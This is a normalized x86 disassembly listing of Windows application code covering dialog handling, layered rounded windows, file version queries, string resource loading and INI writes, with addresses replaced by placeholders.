mov edx [ eax + 0x8 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax rw-data
call sub_41f2d0
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push 0x3c
push 0x1c
push esi
call edx
cmp edi ebp
je r-xdata
xor ecx ecx
lea ecx [ edi + 0x2c ]
jmp r-xdata
lea esi [ edi + 0x1d4 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx esi
call edx
push r--data
push esi
call sub_41ff60
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push 0x3e
push 0x54
push esi
call edx
cmp edi ebp
je r-xdata
lea esi [ edi + 0x228 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx esi
call edx
push r--data
push esi
call sub_41ff60
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push 0x5a
push 0x54
push esi
call edx
mov eax [ edi + 0x4 ]
mov esi [ GetWindowLongW@IAT ]
add edi 0x4
push 0xffffffec
push eax
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] 0x15f
mov [ esp + 0x2c ] 0xc3
call esi
mov ecx [ edi ]
push eax
push ebp
push 0xfffffff0
push ecx
call esi
push eax
lea edx [ esp + 0x24 ]
push edx
call [ AdjustWindowRectEx@IAT ]
mov eax [ edi ]
push ebx
push 0xcc
push ebp
push eax
call [ SetLayeredWindowAttributes@IAT ]
mov ecx [ esp + 0x24 ]
sub ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
sub edx [ esp + 0x18 ]
mov eax [ edi ]
push 0x6
push ecx
push edx
push ebp
push ebp
push ebp
push eax
call [ SetWindowPos@IAT ]
push edi
call sub_4218f0
mov ecx [ esp + 0x34 ]
pop edi
pop esi
pop ebp
mov [ ecx ] 0x1
mov eax 0x1
pop ebx
add esp 0x1c
retn 0x8
sub_41e830
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
cmp [ ebp + 0x1c ] 0x0
push ebx
push esi
push edi
mov esi ecx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
cmp eax 0x5
jne r-xdata
mov edi [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov ebx [ ebp + 0x10 ]
push 0x0
push edi
push edx
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41e330
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
cmp eax 0x110
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov eax 0x1
mov [ ecx ] eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call sub_41e0b0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0x111
jne r-xdata
lea ecx [ esp + 0xc ]
push ecx
push esi
mov [ esp + 0x14 ] 0x1
call sub_41e460
cmp [ esp + 0xc ] 0x0
mov [ edi ] eax
je r-xdata
mov edx 0x4c9
cmp dx bx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx 0x4ca
cmp dx bx
jne r-xdata
shr ebx 0x10
xor eax eax
cmp ax bx
jne r-xdata
shr ebx 0x10
xor eax eax
cmp ax bx
jne r-xdata
push 0x1
push 0x2
jmp r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call [ EndDialog@IAT ]
mov [ edi ] 0x1
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41e960
sub esp 0x24
mov edx [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x34 ]
mov ebp [ esi + 0x18 ]
mov eax [ esi + 0x4 ]
push edi
mov edi [ esp + 0x3c ]
xor ebx ebx
push ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x28 ] ebx
lea ebx [ esp + 0x3c ]
push ebx
push edx
push ecx
mov [ esp + 0x4c ] ebp
lea ebp [ esp + 0x20 ]
mov [ esi + 0x18 ] ebp
mov ebp [ esi ]
push edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x2c ] ecx
push eax
mov eax [ ebp ]
mov ecx esi
mov [ esp + 0x44 ] 0x24
mov [ esp + 0x48 ] 0x1
mov [ esp + 0x2c ] edi
mov [ esp + 0x34 ] edx
call eax
mov ecx [ esp + 0x3c ]
mov ebx eax
mov [ esi + 0x18 ] ecx
test ebx ebx
je r-xdata
cmp edi 0x82
jne r-xdata
cmp edi 0x39
ja r-xdata
mov eax [ esi + 0x1c ]
test al 0x1
je r-xdata
or [ esi + 0x1c ] 0x1
cmp edi 0x110
je r-xdata
je r-xdata
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
add esp 0x24
retn 0x10
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ebx [ esp + 0x38 ]
jmp r-xdata
cmp edi 0x131
jbe r-xdata
cmp edi 0x2e
jb r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
and eax 0xfffffffe
mov [ esi + 0x1c ] eax
mov eax [ edx + 0xc ]
push ecx
mov ecx esi
mov [ esi + 0x4 ] 0x0
call eax
test [ esi + 0x1c ] 0x1
jne r-xdata
cmp edi 0x138
jbe r-xdata
cmp edi 0x2f
jbe r-xdata
mov edx [ esp + 0x38 ]
mov eax [ esi + 0x4 ]
push edx
push 0x0
push eax
call [ SetWindowLongW@IAT ]
jmp r-xdata
cmp edi 0x37
jne r-xdata
sub_41eab0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
push 0x7
push 0x7
lea eax [ esi + 0x1 ]
push eax
mov [ esp + 0x18 ] ecx
lea ecx [ edi + 0x1 ]
push ecx
push 0x0
push 0x0
call [ CreateRoundRectRgn@IAT ]
mov ecx 0x1
mov ebx eax
lea eax [ edi - 0x2 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
lea ecx [ esi - 0x2 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] ecx
xor edi edi
jmp r-xdata
mov eax [ esp + edi * 8 + 0x14 ]
mov ecx [ esp + edi * 8 + 0x10 ]
lea edx [ eax + 0x1 ]
push edx
lea edx [ ecx + 0x1 ]
push edx
push eax
push ecx
call [ CreateRectRgn@IAT ]
push 0x4
mov esi eax
push esi
push ebx
push ebx
call [ CombineRgn@IAT ]
test esi esi
je r-xdata
inc edi
cmp edi 0x4
jl r-xdata
push esi
call [ DeleteObject@IAT ]
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x4 ]
push 0x1
push ebx
push ecx
call [ SetWindowRgn@IAT ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebx
call [ DeleteObject@IAT ]
sub_41eb70
sub esp 0x10
push esi
mov esi ecx
mov ecx [ esi - 0x28 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
call [ GetClientRect@IAT ]
cmp [ esi + 0xa4 ] 0x0
je r-xdata
pop esi
add esp 0x10
retn 0x8
mov eax [ esp + 0x10 ]
mov ecx [ esi + 0xa4 ]
mov edx [ ecx ]
mov edx [ edx ]
push 0x0
push eax
mov eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x24 ]
push 0x0
push 0x0
push eax
call edx
sub_41ebc0
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
mov ecx [ esi - 0x28 ]
lea eax [ esp + 0xc ]
push eax
push ecx
call [ GetClientRect@IAT ]
cmp [ esi + 0xa4 ] 0x0
mov edi [ esp + 0x20 ]
je r-xdata
mov ebx [ rw-data ]
push 0x0
push 0x9
push 0xa
push edi
call sub_423340
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x8
mov eax [ esp + 0x18 ]
mov ecx [ esi + 0xa4 ]
mov edx [ ecx ]
mov edx [ edx ]
push 0x0
push eax
mov eax [ esp + 0x1c ]
push eax
push 0x0
push 0x0
push edi
call edx
sub_41ec20
push 0xffffffff
push sub_45b4f4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
push esi
call sub_41de90
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esi ] r--data
mov [ esi + 0x2c ] r--data
mov [ esi + 0xe4 ] eax
mov [ esi + 0xe8 ] eax
mov [ esi + 0xec ] eax
mov [ esi + 0xf0 ] eax
mov [ esi + 0xf4 ] eax
mov [ esi + 0xf8 ] eax
mov [ esi + 0xfc ] eax
mov [ esi + 0x100 ] eax
mov [ esi + 0x104 ] eax
mov [ esi + 0x114 ] eax
mov [ esi + 0x10c ] eax
mov ecx r--data
mov [ esi + 0xe0 ] ecx
mov [ esi + 0x11c ] eax
mov [ esi + 0x120 ] eax
mov [ esi + 0x124 ] eax
mov [ esi + 0x128 ] eax
mov [ esi + 0x12c ] eax
mov [ esi + 0x130 ] eax
mov [ esi + 0x134 ] eax
mov [ esi + 0x138 ] eax
mov [ esi + 0x13c ] eax
mov [ esi + 0x14c ] eax
mov [ esi + 0x144 ] eax
mov [ esi + 0x118 ] ecx
mov [ esi + 0x154 ] eax
mov [ esi + 0x158 ] eax
mov [ esi + 0x15c ] eax
mov [ esi + 0x160 ] eax
mov [ esi + 0x164 ] eax
mov [ esi + 0x168 ] eax
mov [ esi + 0x16c ] eax
mov [ esi + 0x170 ] eax
mov [ esi + 0x174 ] eax
mov [ esi + 0x178 ] eax
mov [ esi + 0x17c ] eax
lea eax [ esi + 0x180 ]
push eax
mov [ esi + 0x150 ] r--data
call sub_422b50
lea ecx [ esi + 0x1d4 ]
push ecx
mov [ esp + 0x18 ] 0x1
call sub_422b50
lea edx [ esi + 0x228 ]
push edx
mov [ esp + 0x18 ] 0x2
call sub_422b50
lea eax [ esi + 0x27c ]
push eax
mov [ esp + 0x18 ] 0x3
call sub_422b50
or [ esi + 0xdc ] 0x80008
mov [ esi + 0xd0 ] rw-data
mov [ esi + 0xd4 ] rw-data
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_41edc0
push 0xffffffff
push sub_459b9b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x234
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x230 ] eax
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x244 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
xor ebp ebp
test [ rw-data ] al
jne r-xdata
cmp [ rw-data ] ebp
je r-xdata
or [ rw-data ] eax
xor eax eax
push sub_45b7a0
mov [ rw-data ] 0x7
mov [ rw-data ] ebp
mov [ rw-data ] ax
call sub_4413c3
add esp 0x4
push 0x206
lea edx [ esp + 0x3e ]
xor ecx ecx
push ebp
push edx
mov [ esp + 0x44 ] cx
call sub_443360
add esp 0xc
push 0x104
lea eax [ esp + 0x3c ]
push eax
push ebp
call [ GetModuleFileNameW@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x3c ]
push edx
call GetFileVersionInfoSizeW
mov edi eax
cmp edi ebp
jne r-xdata
push 0xffffffff
push ebp
mov eax rw-data
mov ecx ebx
call sub_429a10
jmp r-xdata
push edi
call sub_43f0ce
mov esi eax
add esp 0x4
cmp esi ebp
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
xor eax eax
push edi
push ebp
push esi
call sub_443360
add esp 0xc
push esi
push edi
push ebp
lea eax [ esp + 0x44 ]
push eax
call GetFileVersionInfoW
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
push r--data
push esi
call VerQueryValueW
mov eax [ esp + 0x10 ]
movzx ecx [ eax + 0xe ]
movzx edx [ eax + 0xc ]
movzx edi [ eax + 0xa ]
movzx eax [ eax + 0x8 ]
mov [ esp + 0x30 ] ebp
xor ebp ebp
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x20 ] bp
movzx edx dx
push edx
movzx ecx cx
push ecx
movzx edx ax
movzx eax di
push edx
push eax
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x260 ] ebp
call sub_41f480
add esp 0x14
push 0xffffffff
push ebp
lea eax [ esp + 0x24 ]
mov ecx ebx
call sub_429a10
push 0xffffffff
push ebp
lea eax [ esp + 0x24 ]
mov ecx rw-data
call sub_429a10
push esi
call sub_43f97a
add esp 0x4
cmp [ esp + 0x34 ] 0x8
jb r-xdata
mov eax 0xfffffffd
jmp r-xdata
mov ecx [ esp + 0x244 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x230 ]
xor ecx esp
call sub_43f96b
add esp 0x240
retn
mov ecx [ esp + 0x20 ]
push ecx
call sub_43f960
add esp 0x4
sub_41efa0
push 0xffffffff
push sub_45a60b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xe8 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x104 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x114 ]
mov [ esp + 0x14 ] eax
mov eax 0x1
xor edi edi
mov esi 0x7
test [ rw-data ] al
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
or [ rw-data ] eax
xor ecx ecx
push sub_45b7e0
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] cx
call sub_4413c3
add esp 0x4
xor edx edx
mov [ esp + 0x30 ] esi
mov [ esp + 0x2c ] edi
mov [ esp + 0x1c ] dx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x10c ] edi
call sub_429250
push 0xd
mov eax r--data
lea ecx [ esp + 0x1c ]
call sub_429170
mov eax [ esp + 0x1c ]
mov ebp 0x8
cmp [ esp + 0x30 ] ebp
jae r-xdata
cmp [ rw-data ] 0x8
jb r-xdata
push eax
call sub_42ed00
add esp 0x4
test eax eax
jne r-xdata
lea eax [ esp + 0x1c ]
mov esi rw-data
mov eax [ rw-data ]
mov esi eax
cmp eax edi
jne r-xdata
mov eax [ esp + 0x1c ]
cmp [ esp + 0x30 ] ebp
jae r-xdata
cmp [ esp + 0x30 ] ebp
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
mov eax esi
lea edx [ eax + 0x2 ]
jmp r-xdata
xor eax eax
mov ebx eax
mov eax [ esp + 0x14 ]
push esi
call sub_41fc00
jmp r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov esi eax
cmp esi edi
je r-xdata
lea eax [ esp + 0x1c ]
mov ecx [ esp + 0x104 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xe8 ]
xor ecx esp
call sub_43f96b
add esp 0xfc
retn
mov eax [ esp + 0x1c ]
push eax
jmp r-xdata
sub eax edx
sar eax 0x1
mov ebx eax
mov eax [ esp + 0x14 ]
push esi
call sub_41fc00
jmp r-xdata
cmp [ esp + 0x30 ] ebp
jb r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x1c ]
push ecx
push esi
call [ FreeLibrary@IAT ]
push 0xc6
lea edx [ esp + 0x3a ]
xor ecx ecx
push edi
push edx
mov [ esp + 0x40 ] cx
call sub_443360
add esp 0xc
push 0x64
lea eax [ esp + 0x38 ]
push eax
call ebx
test eax eax
je r-xdata
push rw-data
lea eax [ esp + 0x38 ]
call sub_429d70
mov edi [ esp + 0x14 ]
lea edx [ esp + 0x34 ]
call sub_41f730
sub_41f1a0
push 0xffffffff
push sub_45a9b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
xor eax eax
xor ebx ebx
mov [ esp + 0x14 ] ax
push ebx
mov eax r--data
lea esi [ esp + 0x14 ]
mov [ esp + 0x2c ] 0x7
mov [ esp + 0x28 ] ebx
call sub_429cc0
mov [ esp + 0x38 ] ebx
mov ebx esi
call sub_41edc0
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x3c ] 0x1
call sub_41efa0
add esp 0x4
push 0x5
mov eax r--data
mov ecx edi
call sub_429170
mov edx esi
push 0x0
push edx
or eax 0xffffffff
mov esi edi
call sub_4290b0
push 0x3
mov eax r--data
mov ecx edi
call sub_429170
mov esi [ esp + 0xc ]
mov eax esi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax esi
mov ecx edi
call sub_429170
lea eax [ esi - 0x10 ]
mov [ esp + 0x38 ] 0x0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
cmp [ esp + 0x28 ] 0x8
jb r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
mov ecx [ esp + 0x14 ]
push ecx
call sub_43f960
add esp 0x4
sub_41f2d0
push ecx
push ebx
push edi
mov edi eax
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x28 ] edi
test edi edi
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
test [ esi + 0x4 ] 0x2
je r-xdata
pop edi
pop ebx
pop ecx
retn
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x0
push 0x0
push esi
call eax
mov edi [ esi + 0x28 ]
call sub_4230c0
cmp [ edi + 0x16 ] 0x0
je r-xdata
call sub_4230c0
mov ebx [ edi + 0x10 ]
mov edi [ esi + 0x28 ]
call sub_4230c0
mov ecx [ esi + 0x1c ]
mov edx [ edi + 0xc ]
mov eax [ ecx ]
mov eax [ eax + 0x20 ]
push ebx
push edx
push esi
call eax
and [ esi + 0x4 ] 0xfffffff7
or [ esi + 0x4 ] 0x8
jmp r-xdata
sub_41f340
push 0xffffffff
push sub_45a5d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x34 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x44 ]
xor ebp ebp
mov [ esp + 0x10 ] eax
xor ecx ecx
push ebp
mov eax r--data
lea esi [ esp + 0x18 ]
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] ebp
mov [ esp + 0x1c ] cx
call sub_429cc0
push ebp
mov eax r--data
mov [ esp + 0x40 ] ebp
call sub_429cc0
mov ebx esi
call sub_421bb0
test al al
je r-xdata
or esi 0xffffffff
cmp [ esp + 0x2c ] 0x8
jb r-xdata
cmp [ esp + 0x28 ] ebp
je r-xdata
mov eax esi
jmp r-xdata
mov ecx [ esp + 0x18 ]
push ecx
call sub_43f960
add esp 0x4
mov eax esi
jmp r-xdata
push 0x16
mov eax r--data
mov ecx esi
call sub_429170
cmp [ esp + 0x28 ] ebp
je r-xdata
mov ecx [ esp + 0x34 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
cmp edi ebp
je r-xdata
mov eax [ esp + 0x18 ]
mov ebx 0x8
cmp [ esp + 0x2c ] ebx
jae r-xdata
push eax
mov eax [ esp + 0x14 ]
call sub_428aa0
push eax
push edi
push r--data
call [ WritePrivateProfileStringW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x18 ]
cmp [ esp + 0x2c ] ebx
jb r-xdata
lea esi [ eax - 0x2 ]
cmp [ esp + 0x2c ] ebx
jb r-xdata
mov eax ebp
mov eax [ esp + 0x18 ]
push eax
call sub_43f960
add esp 0x4
mov edx [ esp + 0x18 ]
push edx
call sub_43f960
add esp 0x4
sub_41f480
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
test eax eax
je r-xdata
pop esi
retn
push ebx
push ebp
push edi
lea ecx [ esp + 0x18 ]
push ecx
push eax
call sub_441acd
mov ecx [ esi + 0x14 ]
mov ebp eax
lea edi [ ebp + 0x1 ]
add esp 0x8
cmp edi ecx
ja r-xdata
mov eax edi
push 0x0
sub eax ecx
mov ebx esi
call sub_421af0
or eax 0xffffffff
mov ebx edi
call sub_429980
jmp r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_43f111
cmp [ esi + 0x14 ] 0x0
ja r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x18 ]
push edx
push ecx
push edi
push eax
call sub_441a59
add esp 0x10
mov eax 0x1
mov ebx ebp
call sub_429980
pop edi
pop ebp
pop ebx
sub_41f500
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
pop edi
retn
push eax
call sub_44120e
add esp 0x4
mov [ esi ] edi
sub_41f520
push ebx
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
pop ebx
retn
push edi
xor edi edi
cmp [ esi + 0x4 ] ebx
jle r-xdata
mov ecx [ esi ]
push ecx
call sub_44120e
add esp 0x4
mov [ esi ] ebx
pop edi
nop
inc edi
cmp edi [ esi + 0x4 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov eax [ eax + edi * 4 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
sub_41f580
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
xor edi edi
push edi
mov ecx rw-data
call sub_43f1a9
mov esi eax
mov [ esp + 0x10 ] 0x1
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
test edi edi
jne r-xdata
mov eax ebp
shr eax 0x4
inc eax
push edi
movzx ecx ax
push ecx
push 0x6
push esi
call [ FindResourceExW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ebx [ esp + 0x10 ]
push ebx
mov ecx rw-data
call sub_43f1a9
mov esi eax
inc ebx
mov [ esp + 0x10 ] ebx
test esi esi
jne r-xdata
push esi
mov eax ebp
call sub_41f600
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_41f600
push ebp
mov ebp [ esp + 0x8 ]
push edi
push ebx
push ebp
mov edi eax
call [ LoadResource@IAT ]
test eax eax
jne r-xdata
push esi
push eax
call [ LockResource@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop ebp
retn
pop esi
pop edi
xor eax eax
pop ebp
retn
push ebx
push ebp
call [ SizeofResource@IAT ]
add eax esi
and edi 0xf
jbe r-xdata
cmp esi eax
jb r-xdata
cmp esi eax
jae r-xdata
movzx eax [ esi ]
neg eax
sbb eax eax
and eax esi
pop esi
pop edi
pop ebp
retn
sub edi 0x1
movzx ecx [ esi ]
lea esi [ esi + ecx * 2 + 0x2 ]
jne r-xdata
sub_41f660
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi eax
push edi
shr eax 0x4
mov edi ecx
inc eax
movzx ecx ax
push 0x6
push ecx
push edi
call [ FindResourceW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x4
push edi
mov eax esi
call sub_41f600
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax [ ebp ]
movzx edi [ esi ]
sub eax 0x10
mov edx 0x1
sub edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub eax edi
or edx eax
jge r-xdata
movzx eax [ esi ]
mov ebx [ ebp ]
lea edx [ esi + 0x2 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx edi
mov eax ebp
call sub_41fb90
lea ecx [ eax + eax ]
push ecx
push edx
lea esi [ edi + edi ]
push esi
push ebx
call sub_43f985
push eax
call sub_4237a0
add esp 0x14
test edi edi
jl r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
push 0x80070057
call sub_427e00
mov eax [ ebp ]
cmp edi [ eax - 0x8 ]
jg r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
inc eax
mov [ eax - 0xc ] edi
mov edx [ ebp ]
xor eax eax
pop edi
mov [ esi + edx ] ax
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x4
sub_41f730
test edx edx
jne r-xdata
mov eax edx
push esi
lea esi [ eax + 0x2 ]
jmp r-xdata
xor eax eax
push ebx
mov ebx eax
push edx
mov eax edi
call sub_41fc00
mov eax edi
pop ebx
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
pop esi
sar eax 0x1
push ebx
mov ebx eax
push edx
mov eax edi
call sub_41fc00
mov eax edi
pop ebx
retn
sub_41f770
push 0xffffffff
push sub_45a228
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x20 ]
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
mov edi r--data
call edx
add eax 0x10
mov [ esi ] eax
mov eax edi
mov [ esp + 0x18 ] 0x0
test eax 0xffff0000
jne r-xdata
mov eax r--data
lea edx [ eax + 0x2 ]
movzx edi di
push edi
call sub_41f580
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov ebx eax
push r--data
mov eax esi
call sub_41fc00
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xc
retn 0x4
push esi
mov eax edi
call sub_41f660
jmp r-xdata
sub_41f820
push 0xffffffff
push sub_4598e5
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
lea esi [ ecx + edx * 4 ]
mov [ esp + 0x10 ] 0x0
test esi esi
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x8
mov eax [ esp + 0x1c ]
mov eax [ eax ]
sub eax 0x10
call sub_41fd40
add eax 0x10
mov [ esi ] eax
sub_41f880
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
push edi
cmp edx eax
jne r-xdata
mov edx [ esi + 0x4 ]
push ebx
push esi
call sub_41f820
inc [ esi + 0x4 ]
mov eax 0x1
pop edi
retn
mov ecx [ esi ]
cmp ebx ecx
jb r-xdata
test eax eax
jne r-xdata
lea edi [ ecx + eax * 4 ]
cmp ebx edi
jae r-xdata
